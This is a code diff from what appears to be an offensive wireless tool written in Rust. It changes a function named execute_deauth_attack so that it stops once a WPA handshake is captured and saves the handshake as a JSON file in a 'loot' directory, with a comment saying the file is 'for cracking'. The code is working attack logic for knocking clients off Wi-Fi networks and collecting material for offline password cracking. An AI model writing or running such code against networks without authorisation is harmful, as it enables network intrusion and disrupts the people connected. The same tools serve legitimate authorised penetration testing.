@@ -151,7 +151,7 @@ pub fn execute_deauth_attack(
         bidirectional: true,
         include_disassoc: false,
         capture_handshake: true,
-        stop_on_handshake: false,
+        stop_on_handshake: true,
     };
 
     on_progress(0.20, "Starting deauth attack with capture...");
@@ -159,7 +159,7 @@ pub fn execute_deauth_attack(
     // Create attacker and execute with capture
     let mut attacker = DeauthAttacker::new(&iface).context("Failed to create deauth attacker")?;
 
-    let (stats, captured_packets) = attacker
+    let (stats, captured_packets, handshake_export) = attacker
         .attack_with_capture(bssid, client, native_config)
         .context("Deauth attack failed")?;
 
@@ -178,6 +178,20 @@ pub fn execute_deauth_attack(
                 .with_context(|| format!("Writing capture file: {}", capture_file.display()))?;
             capture_files.push(capture_file.clone());
         }
+    }
+
+    // Save handshake export (JSON) for cracking
+    let mut handshake_export_path = None;
+    if let Some(export) = handshake_export {
+        let export_bundle = serde_json::json!({
+            "ssid": ssid_display,
+            "handshake": export,
+        });
+        let export_file = loot_dir.join(format!("handshake_export_{}_{}.json", safe_ssid, timestamp));
+        fs::write(&export_file, serde_json::to_vec_pretty(&export_bundle)?)
+            .with_context(|| format!("Writing handshake export: {}", export_file.display()))?;
+        handshake_export_path = Some(export_file.clone());
+        capture_files.push(export_file);
     }
 
     on_progress(0.95, "Restoring interface...");
